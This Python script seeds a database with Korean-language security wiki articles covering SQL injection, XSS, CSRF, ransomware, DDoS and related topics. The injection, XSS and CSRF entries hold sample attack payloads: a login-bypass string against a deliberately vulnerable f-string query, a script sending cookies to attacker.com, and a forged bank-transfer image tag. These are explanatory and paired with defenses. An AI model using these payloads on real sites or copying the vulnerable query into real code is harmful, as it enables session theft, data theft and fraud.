from database import SessionLocal
from models import Wiki
from datetime import datetime

db = SessionLocal()

# 실제 보안 지식 데이터
security_knowledge = [
    {
        "title": "SQL Injection (SQL 인젝션)",
        "category": "웹 보안",
        "type": "web",
        "preview": "데이터베이스 쿼리에 악의적인 SQL 코드를 삽입하여 인증을 우회하거나 데이터를 탈취하는 공격",
        "content": """## SQL Injection이란?

SQL 인젝션은 웹 애플리케이션의 입력값 검증이 부족할 때 발생하는 공격입니다. 공격자가 SQL 쿼리의 일부로 악의적인 코드를 삽입하여 데이터베이스를 조작합니다.

### 공격 예시
```python
# 취약한 코드
query = f"SELECT * FROM users WHERE id = '{user_id}'"

# 공격 입력: ' OR '1'='1
# 결과 쿼리: SELECT * FROM users WHERE id = '' OR '1'='1'
# → 모든 사용자 정보 노출
```

### 방어 방법
1. **Prepared Statement 사용**
2. **입력값 검증 및 이스케이프**
3. **최소 권한 원칙 적용**
4. **WAF(Web Application Firewall) 사용**

### 실제 피해 사례
- 2017년 Equifax 데이터 유출 (1억 4천만 명 개인정보 유출)
- 2011년 Sony PlayStation Network 해킹 (7,700만 계정 정보 유출)
"""
    },
    {
        "title": "Cross-Site Scripting (XSS)",
        "category": "웹 보안",
        "type": "web",
        "preview": "웹 페이지에 악성 스크립트를 삽입하여 사용자의 브라우저에서 실행되게 하는 공격",
        "content": """## XSS란?

XSS는 웹 사이트에 악성 스크립트를 주입하여 다른 사용자의 브라우저에서 실행시키는 공격입니다.

### 공격 유형
1. **Reflected XSS**: URL 파라미터를 통한 공격
2. **Stored XSS**: DB에 저장된 스크립트 실행
3. **DOM-based XSS**: 클라이언트 측 스크립트 조작

### 공격 예시
```html
<!-- 게시판 댓글에 삽입 -->
<script>
  document.location='http://attacker.com/steal?cookie='+document.cookie;
</script>
```

### 방어 방법
1. **입력값 필터링 및 인코딩**
2. **Content Security Policy (CSP) 적용**
3. **HttpOnly 쿠키 사용**
4. **출력값 이스케이프 처리**

### 영향
- 세션 하이재킹
- 개인정보 탈취
- 피싱 공격
"""
    },
    {
        "title": "Cross-Site Request Forgery (CSRF)",
        "category": "웹 보안",
        "type": "web",
        "preview": "사용자의 의도와 무관하게 공격자가 의도한 행위를 특정 웹사이트에 요청하게 하는 공격",
        "content": """## CSRF란?

로그인된 사용자가 자신의 의지와 무관하게 공격자가 의도한 행위를 하도록 만드는 공격입니다.

### 공격 시나리오
1. 사용자가 은행 사이트에 로그인
2. 공격자의 메일/게시물에 포함된 링크 클릭
3. 사용자 모르게 송금 요청 실행

### 공격 예시
```html
<!-- 공격자가 만든 이미지 태그 -->
<img src="https://bank.com/transfer?to=attacker&amount=1000000">
```

### 방어 방법
1. **CSRF 토큰 사용**
2. **SameSite 쿠키 속성**
3. **Referer 검증**
4. **재인증 요구 (중요 작업 시)**
"""
    },
    {
        "title": "Zero Trust Architecture",
        "category": "네트워크 보안",
        "type": "network",
        "preview": "'절대 신뢰하지 말고 항상 검증하라'는 원칙의 최신 보안 모델",
        "content": """## Zero Trust란?

전통적인 경계 기반 보안에서 벗어나 모든 접근을 신뢰하지 않고 검증하는 보안 모델입니다.

### 핵심 원칙
1. **최소 권한 (Least Privilege)**
2. **지속적인 검증**
3. **네트워크 마이크로 세그멘테이션**
4. **다단계 인증 (MFA)**

### 구성 요소
- Identity and Access Management (IAM)
- Multi-Factor Authentication (MFA)
- Micro-segmentation
- Continuous Monitoring
- Encryption

### 도입 효과
- 내부 위협 차단
- 랜섬웨어 확산 방지
- 클라우드 환경 보안 강화
"""
    },
    {
        "title": "Ransomware (랜섬웨어)",
        "category": "악성코드",
        "type": "malware",
        "preview": "파일을 암호화하고 복호화 대가로 금전을 요구하는 악성 소프트웨어",
        "content": """## 랜섬웨어란?

시스템의 파일을 암호화한 후 복구 대가로 금전(비트코인 등)을 요구하는 악성코드입니다.

### 감염 경로
1. **피싱 메일 첨부파일**
2. **취약한 RDP 접속**
3. **악성 광고 (Malvertising)**
4. **공급망 공격**

### 주요 변종
- WannaCry (2017)
- NotPetya (2017)
- REvil/Sodinokibi
- LockBit
- BlackCat/ALPHV

### 방어 대책
1. **정기적인 백업** (오프라인 백업 포함)
2. **패치 관리**
3. **이메일 필터링**
4. **EDR 솔루션 도입**
5. **사용자 교육**

### 피해 통계
- 2023년 글로벌 랜섬웨어 피해액: 약 20억 달러
- 평균 복구 비용: 185만 달러
"""
    },
    {
        "title": "공개키 암호화 (Public Key Cryptography)",
        "category": "암호학",
        "type": "crypto",
        "preview": "공개키와 개인키 쌍을 사용하여 암호화 및 전자서명을 수행하는 암호화 방식",
        "content": """## 공개키 암호화란?

비대칭키 암호화라고도 하며, 공개키로 암호화하고 개인키로 복호화하는 방식입니다.

### 작동 원리
1. **키 생성**: 공개키와 개인키 쌍 생성
2. **암호화**: 공개키로 암호화
3. **복호화**: 개인키로 복호화

### 주요 알고리즘
- **RSA**: 가장 널리 사용 (2048bit 이상 권장)
- **ECC (타원곡선)**: RSA보다 짧은 키로 동일 보안
- **DSA**: 전자서명 전용

### 사용 사례
1. **HTTPS/SSL/TLS**: 웹 통신 암호화
2. **이메일 암호화**: PGP/GPG
3. **전자서명**: 문서 인증
4. **SSH**: 서버 접속

### 대칭키 vs 비대칭키
| 구분 | 대칭키 | 비대칭키 |
|------|--------|----------|
| 키 개수 | 1개 | 2개 (공개/개인) |
| 속도 | 빠름 | 느림 |
| 키 배포 | 어려움 | 쉬움 |
| 용도 | 대용량 암호화 | 키 교환, 서명 |
"""
    },
    {
        "title": "DDoS 공격 (분산 서비스 거부)",
        "category": "네트워크 보안",
        "type": "network",
        "preview": "다수의 좀비 PC를 이용해 대상 서버에 과부하를 일으켜 정상 서비스를 방해하는 공격",
        "content": """## DDoS 공격이란?

여러 시스템에서 동시에 대량의 트래픽을 발생시켜 서비스를 마비시키는 공격입니다.

### 공격 유형
1. **Volumetric Attack**: 대역폭 소진 (UDP Flood, ICMP Flood)
2. **Protocol Attack**: 프로토콜 약점 이용 (SYN Flood)
3. **Application Layer Attack**: 애플리케이션 리소스 고갈 (HTTP Flood)

### 공격 규모
- 2023년 최대 기록: 3.8 Tbps
- 일반적 공격 규모: 100 Gbps ~ 1 Tbps

### 방어 방법
1. **CDN 및 DDoS 방어 서비스** (Cloudflare, Akamai)
2. **트래픽 필터링**
3. **Rate Limiting**
4. **Anycast 네트워크**
5. **잉여 대역폭 확보**

### 주요 공격 사례
- 2016년 Dyn DNS 공격 (Mirai 봇넷, 1Tbps)
- 2018년 GitHub 공격 (1.35 Tbps)
"""
    },
    {
        "title": "OWASP Top 10",
        "category": "웹 보안",
        "type": "web",
        "preview": "웹 애플리케이션의 가장 중요한 10가지 보안 위협 목록",
        "content": """## OWASP Top 10 (2021)

웹 애플리케이션 보안의 가장 중요한 위협 목록입니다.

### 2021년 목록
1. **A01: Broken Access Control** - 권한 관리 실패
2. **A02: Cryptographic Failures** - 암호화 실패
3. **A03: Injection** - 인젝션 공격
4. **A04: Insecure Design** - 불안전한 설계
5. **A05: Security Misconfiguration** - 보안 설정 오류
6. **A06: Vulnerable Components** - 취약한 구성요소
7. **A07: Authentication Failures** - 인증 실패
8. **A08: Data Integrity Failures** - 데이터 무결성 실패
9. **A09: Logging Failures** - 로깅 및 모니터링 실패
10. **A10: Server-Side Request Forgery** - SSRF

### 주요 변경사항 (2017 → 2021)
- Broken Access Control이 1위로 상승
- Cryptographic Failures 신규 진입
- XML External Entities (XXE) 제외

### 대응 방법
각 위협에 대한 구체적인 방어 기법은 OWASP 공식 문서 참조
"""
    }
]

# 데이터 추가
print("=== 보안 지식 추가 시작 ===\n")
count = 0

for item in security_knowledge:
    # 중복 체크
    existing = db.query(Wiki).filter(Wiki.title == item["title"]).first()
    if existing:
        print(f"[SKIP] 이미 존재: {item['title']}")
        continue
    
    wiki = Wiki(
        title=item["title"],
        category=item["category"],
        type=item["type"],
        preview=item["preview"],
        content=item["content"],
        created_at=datetime.now()
    )
    db.add(wiki)
    count += 1
    print(f"[ADD] 추가: {item['title']}")

db.commit()
print(f"\n=== 완료: {count}개 문서 추가 ===")
db.close()
